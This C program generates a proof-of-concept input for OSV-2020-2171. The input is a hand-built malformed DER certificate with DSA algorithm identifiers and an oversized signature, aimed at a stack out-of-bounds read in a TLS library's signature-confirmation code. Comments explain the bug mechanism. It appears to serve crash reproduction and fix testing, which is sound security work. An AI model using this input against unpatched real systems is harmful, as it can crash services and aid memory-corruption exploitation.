/*
 * gen_poc.c: Generate a binary PoC for OSV-2020-2171
 *
 * The harness parses raw bytes as a DER-encoded X.509 certificate.
 * We need a minimal DER certificate that:
 *   1. Has a DSA public key (OID 1.2.840.10040.4.1)
 *   2. Has a DSA signature whose size != DSA_SIG_SIZE (40 bytes)
 *      to trigger the DecodeECC_DSA_Sig fallback path
 *
 * Bug mechanism:
 *   When built with --disable-ecc --enable-dsa:
 *   - struct SignatureCtx is missing the 'verify' field
 *   - ConfirmSignature() DSAk case calls DecodeECC_DSA_Sig() unconditionally
 *   - The struct layout mismatch causes stack corruption
 *   - wc_RsaPublicKeyDecodeRaw reads from corrupted stack -> stack-OOB
 *
 * We generate a minimal self-signed DSA certificate in DER format.
 * The certificate structure is intentionally malformed to trigger the
 * vulnerable code path quickly.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

/* Helper: write ASN.1 length */
static int write_asn1_len(unsigned char *buf, int len) {
    if (len < 0x80) {
        buf[0] = (unsigned char)len;
        return 1;
    } else if (len < 0x100) {
        buf[0] = 0x81;
        buf[1] = (unsigned char)len;
        return 2;
    } else {
        buf[0] = 0x82;
        buf[1] = (unsigned char)(len >> 8);
        buf[2] = (unsigned char)(len & 0xFF);
        return 3;
    }
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /*
     * Construct a minimal DER certificate with DSA algorithm OID.
     * The certificate doesn't need to be valid -- just well-formed enough
     * to reach the ConfirmSignature DSA code path.
     *
     * Minimal structure:
     * SEQUENCE {
     *   SEQUENCE { -- tbsCertificate
     *     [0] INTEGER 2  -- version v3
     *     INTEGER 1      -- serialNumber
     *     SEQUENCE { OID 1.2.840.10040.4.3 }  -- signature (id-dsa-with-sha1)
     *     SEQUENCE { SET { SEQUENCE { OID 2.5.4.3, UTF8STRING "X" } } } -- issuer
     *     SEQUENCE { UTCTime, UTCTime }  -- validity
     *     SEQUENCE { SET { SEQUENCE { OID 2.5.4.3, UTF8STRING "X" } } } -- subject
     *     SEQUENCE {  -- subjectPublicKeyInfo
     *       SEQUENCE { OID 1.2.840.10040.4.1 }  -- DSA algorithm
     *       BITSTRING { ... }  -- DSA public key (dummy data)
     *     }
     *   }
     *   SEQUENCE { OID 1.2.840.10040.4.3 }  -- signatureAlgorithm
     *   BITSTRING { ... }  -- signatureValue (non-standard size to trigger bug)
     * }
     */

    /* Pre-built minimal DER certificate with DSA key.
     * This is a hand-crafted certificate that triggers the vulnerable path. */
    unsigned char cert[] = {
        /* SEQUENCE (outer certificate) */
        0x30, 0x81, 0xA0,
        /* SEQUENCE (tbsCertificate) */
          0x30, 0x6E,
            /* [0] EXPLICIT INTEGER 2 (version v3) */
            0xA0, 0x03, 0x02, 0x01, 0x02,
            /* INTEGER 1 (serialNumber) */
            0x02, 0x01, 0x01,
            /* SEQUENCE { OID 1.2.840.10040.4.3 } (id-dsa-with-sha1) */
            0x30, 0x09, 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x38, 0x04, 0x03,
            /* SEQUENCE { SET { SEQUENCE { OID 2.5.4.3, UTF8String "X" } } } (issuer) */
            0x30, 0x0E, 0x31, 0x0C, 0x30, 0x0A,
              0x06, 0x03, 0x55, 0x04, 0x03,
              0x0C, 0x03, 0x58, 0x58, 0x58,
            /* SEQUENCE { UTCTime "200101000000Z", UTCTime "300101000000Z" } (validity) */
            0x30, 0x1E,
              0x17, 0x0D, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A,
              0x17, 0x0D, 0x33, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A,
            /* SEQUENCE { SET { SEQUENCE { OID 2.5.4.3, UTF8String "X" } } } (subject) */
            0x30, 0x0E, 0x31, 0x0C, 0x30, 0x0A,
              0x06, 0x03, 0x55, 0x04, 0x03,
              0x0C, 0x03, 0x58, 0x58, 0x58,
            /* SEQUENCE { subjectPublicKeyInfo with DSA OID } */
            0x30, 0x11,
              /* SEQUENCE { OID 1.2.840.10040.4.1 } (id-dsa) */
              0x30, 0x09, 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x38, 0x04, 0x01,
              /* BIT STRING (dummy DSA public key) */
              0x03, 0x04, 0x00, 0x02, 0x01, 0x01,
          /* SEQUENCE { OID 1.2.840.10040.4.3 } (signatureAlgorithm) */
          0x30, 0x09, 0x06, 0x07, 0x2A, 0x86, 0x48, 0xCE, 0x38, 0x04, 0x03,
          /* BIT STRING (signatureValue - NOT 40 bytes, triggers DSA sig decode) */
          0x03, 0x1D, 0x00,
            /* DER-encoded DSA sig: SEQUENCE { INTEGER r, INTEGER s }
             * Using a non-standard-sized signature to trigger the
             * DecodeECC_DSA_Sig fallback path in ConfirmSignature */
            0x30, 0x1A,
              0x02, 0x0D, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                          0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
              0x02, 0x09, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                          0xFF, 0xFF, 0xFF,
    };

    fwrite(cert, 1, sizeof(cert), f);
    fclose(f);
    fprintf(stderr, "Generated %s (%zu bytes)\n", outfile, sizeof(cert));
    return 0;
}
